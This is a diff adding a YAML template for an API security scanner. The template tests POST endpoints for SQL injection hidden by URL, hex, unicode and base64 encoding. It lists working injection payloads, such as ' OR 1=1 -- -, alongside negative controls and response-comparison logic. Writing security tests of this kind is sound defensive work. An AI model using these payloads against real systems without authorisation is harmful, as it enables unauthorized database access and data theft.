@@ -1,0 +1,172 @@
+id: ALTERNATE_ENCODING_SQLI_POST
+info:
+  name: "SQL Injection test using Alternate Encoding for POST method APIs"
+  description: "The SQL Injection Test Using Alternate Encoding for POST Method APIs identifies vulnerabilities where attackers bypass standard input validation by using alternate encoding techniques. These include URL encoding, Unicode, or hexadecimal representations to inject malicious SQL queries into POST method APIs. This approach evades simple filtering mechanisms, allowing unauthorized database access or manipulation. Properly decoding and validating all input is critical to mitigate such attacks."
+  details: "The SQL Injection Test Using Alternate Encoding for POST Method APIs evaluates if alternate encoding methods like URL encoding (`%27` for `'`), Unicode (`\u0027`), or hexadecimal can bypass input sanitization mechanisms. Attackers leverage these techniques to disguise malicious SQL payloads and evade detection. This test targets POST API endpoints that handle encoded inputs without proper decoding or validation, potentially allowing unauthorized database queries. Mitigation involves decoding inputs before validation and implementing parameterized queries to ensure robust defense against injection attacks."
+  impact: "The impact of the SQL Injection Test Using Alternate Encoding for POST Method APIs can be significant, as attackers could bypass input filters and inject malicious SQL queries using alternative encodings. This allows unauthorized access to or manipulation of sensitive database information, potentially leading to data breaches, loss of data integrity, and unauthorized privilege escalation. Additionally, it could result in a compromised system, leading to reputational damage and regulatory consequences. Effective mitigation requires proper decoding of inputs and securing API endpoints with parameterized queries and strong validation."
+
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: ALTERNATE_ENCODING_SQLI_POST
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2020-24008
+    - CVE-2021-45901
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    eq: "POST"
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+      - <html>
+      - </html>
+  request_payload:
+    for_one:
+      key:
+        regex: ".*"
+        extract: userKey
+      value:
+        extract: userVal
+wordLists:
+  encodingPayloads:
+    - "' OR 0x31=0x31"
+    - " dXNlcidvciAnMQ=="
+    - "' OR '\u0031'='\u0031"
+    - "' OR U&'\\0061'='a"
+    - "%27%20OR%20%271%27%3D%271"
+    - "' OR ASCII('1')=49"
+    - "' OR 1=1 -- -"
+  encodingNegativePayloads:
+    - "' OR 0x31<>0x31"
+    - " JyBvciAxPTAtLQ=="
+    - "' OR '\u0031'<>'\u0031"
+    - "' OR U&'\\0061'<>'a"
+    - "%27%20OR%20%271%27%3D%270"
+    - "' OR ASCII('1')<>49"
+    - "' OR 1<>1 -- -"
+execute:
+  type: multiple
+  requests:
+  - req:
+    - modify_body_param:
+        userKey: ${userVal}${encodingPayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0
+          not_contains:
+            - Error
+            - Internal Server 
+            - Failed
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid token
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts
+            - " OR "
+    - success: x2
+    - failure: exit
+  - req:
+    - modify_body_param:
+        userKey: ${userVal}${encodingNegativePayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0  
+          not_contains:
+            - Error
+            - Internal Server 
+            - Failed
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid token
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts
+            - " OR "    
+          neq: "${x1.response.body}"
+    - success: vulnerable
